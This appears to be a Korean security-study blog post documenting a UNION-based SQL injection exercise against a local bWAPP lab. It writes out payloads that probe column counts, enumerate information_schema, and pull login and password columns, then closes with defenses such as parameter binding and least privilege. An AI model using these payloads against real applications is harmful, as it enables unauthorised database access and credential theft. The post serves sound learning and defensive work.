---
layout: post
title: "bWAPP SQL Injection 실습: UNION SELECT와 information_schema 분석"
date: 2026-11-05
categories: [cyber-security, sql]
tags: [bWAPP, SQL-Injection, MySQL, UNION, information_schema]
description: "격리된 bWAPP 실습 환경에서 UNION 기반 SQL Injection의 컬럼 수 확인, 스키마 탐색, 결과 출력 원리를 분석합니다."
---

> **실습 범위:** 본 글은 본인이 구성한 bWAPP 취약점 실습 환경을 대상으로 한 학습 기록입니다. 실제 운영 서비스나 허가받지 않은 시스템에는 적용하지 않습니다.
>
> **원본 및 실습 스크린샷:** [Notion 실습 문서](https://app.notion.com/p/40faa16a5aa48068bc63e242c31621a7). Notion 첨부 이미지의 GitHub 업로드가 아직 완료되지 않아 원본에서 확인할 수 있습니다.

## 1. SQL Injection과 LIKE 검색

영화 검색 기능이 사용자 입력을 SQL 문자열에 직접 연결하면, 입력한 작은따옴표가 문자열을 닫아 쿼리 구조를 바꿀 수 있습니다.

```sql
SELECT * FROM movies WHERE title LIKE '%입력값%';
```

`LIKE` 패턴에서 `%I`는 I로 끝나는 값, `I%`는 I로 시작하는 값, `%I%`는 I가 포함된 값을 검색합니다.

예를 들어 검색어 뒤에 SQL 주석을 결합하면 애플리케이션이 붙인 나머지 조건을 무력화하는 상황을 관찰할 수 있습니다. MySQL에서 `--` 주석은 뒤에 공백이 필요하며, `#`도 줄 끝까지 주석으로 처리합니다.

## 2. UNION SELECT의 컬럼 수 확인

`UNION`은 두 SELECT 결과를 세로로 합칩니다. 이때 양쪽 SELECT의 **컬럼 개수가 같아야** 하고, 대응 위치의 자료형도 호환되어야 합니다.

bWAPP 영화 조회 실습에서는 다음처럼 출력 컬럼 개수를 늘려 확인했습니다.

```text
' UNION SELECT 1 #
' UNION SELECT 1,2 #
' AND 1=0 UNION SELECT 1,2,3,4,5,6,7 #
```

실습 화면에서 **7개 컬럼**이 일치했습니다. 화면에 숫자가 표시되는 위치는 이후 데이터가 노출될 수 있는 출력 위치를 파악하는 데 도움이 됩니다. `AND 1=0`은 기존 검색 결과를 비우는 데 사용했습니다.

> **스크린샷:** 컬럼 개수 확인 및 1~7 출력 위치는 [원본 Notion](https://app.notion.com/p/40faa16a5aa48068bc63e242c31621a7)에서 확인하세요.

## 3. information_schema로 데이터베이스 구조 확인

MySQL의 `information_schema`는 스키마, 테이블, 컬럼, 인덱스, 제약조건 등 메타데이터를 제공합니다.

| 테이블 | 확인할 수 있는 정보 |
| --- | --- |
| `SCHEMATA` | 데이터베이스 목록 (`SCHEMA_NAME`) |
| `TABLES` | 테이블 목록 (`TABLE_SCHEMA`, `TABLE_NAME`) |
| `COLUMNS` | 컬럼 이름, 자료형, 순서 (`COLUMN_NAME`, `DATA_TYPE`, `ORDINAL_POSITION`) |
| `STATISTICS` | 인덱스 구성 |
| `TABLE_CONSTRAINTS` | 제약조건 종류 |

### 데이터베이스 목록

```sql
' AND 1=0 UNION SELECT 1,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL
FROM information_schema.SCHEMATA #
```

실습 결과에서는 `information_schema`, `bWAPP`, `drupageddon`, `mysql`, `testdb` 등의 스키마를 관찰했습니다.

### testdb의 테이블 목록

```sql
' AND 1=0 UNION SELECT 1,TABLE_NAME,NULL,NULL,NULL,NULL,NULL
FROM information_schema.TABLES
WHERE TABLE_SCHEMA='testdb' #
```

실습용 `testdb`에는 `cisco`, `linux`, `security` 테이블이 있었습니다.

### 컬럼과 자료형 확인

```sql
' AND 1=0 UNION SELECT
  1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='cisco' #
```

`TABLE_NAME` 조건을 `linux` 또는 `security`로 바꾸면 각 테이블의 컬럼을 확인할 수 있습니다. `ORDINAL_POSITION`은 컬럼의 정의 순서를 나타냅니다. **쿼리 결과의 행 순서는 ORDER BY가 없으면 보장되지 않습니다.**

## 4. UNION 결과와 화면 출력의 관계

실습용 테이블에서 확인한 컬럼 이름은 `id`, `login`, `password`, `username`, `age`입니다. 영화 검색 화면에 실습 데이터를 표시하기 위해 다음과 같이 출력 위치를 맞췄습니다.

```sql
' AND 1=0 UNION ALL SELECT
  1,login,password,username,NULL,NULL,NULL
FROM testdb.cisco #
```

`UNION ALL`은 중복 행을 제거하지 않고 결과를 이어 붙입니다. `UNION`은 기본적으로 중복을 제거합니다. 실제 출력되는 화면 컬럼과 SQL 결과 컬럼의 위치는 다를 수 있으므로 숫자 표시 실험으로 매핑해야 합니다.

같은 방식으로 `testdb.linux`, `testdb.security`의 **실습용 더미 데이터**를 확인했습니다. 계정과 비밀번호 예제는 공개 글에서 재사용을 피하기 위해 원본의 구체적인 값을 생략했습니다.

## 5. 해시 관찰과 주의사항

실습에서 32자리와 40자리의 16진수 해시 문자열을 관찰했습니다. **문자열 길이만으로 해시 알고리즘을 확정할 수는 없습니다.** 예를 들어 32자리 16진수는 MD5 형식, 40자리 16진수는 SHA-1 형식일 수 있으나 실제 알고리즘은 생성 코드나 검증 실험으로 확인해야 합니다. 솔트 사용 여부 역시 출력값만으로 단정하지 않습니다.

비밀번호 저장에는 빠른 일반 해시 대신 고유 솔트와 적절한 비용 파라미터를 사용하는 **Argon2id** 같은 비밀번호 전용 해시 함수를 권장합니다.

## 6. 방어 관점 정리

- **Prepared Statement / 파라미터 바인딩:** 입력값을 SQL 문법과 분리합니다.
- **최소 권한:** 웹 애플리케이션 DB 계정이 다른 데이터베이스의 민감한 테이블을 조회하지 못하도록 제한합니다.
- **오류 메시지 관리:** SQL 오류 및 내부 스키마 정보를 사용자에게 그대로 노출하지 않습니다.
- **테스트:** 문자열 검색과 숫자 파라미터 모두 정상·비정상 입력을 검증합니다.

이번 실습의 핵심은 `UNION`의 컬럼 수 제약과 `information_schema`의 구조를 이해하고, 문자열 연결 기반 SQL 쿼리가 왜 위험한지 확인하는 것이었습니다.

---

*원본: [Notion — sql ingection(bWAPP) test](https://app.notion.com/p/40faa16a5aa48068bc63e242c31621a7) · 2026-11-05*
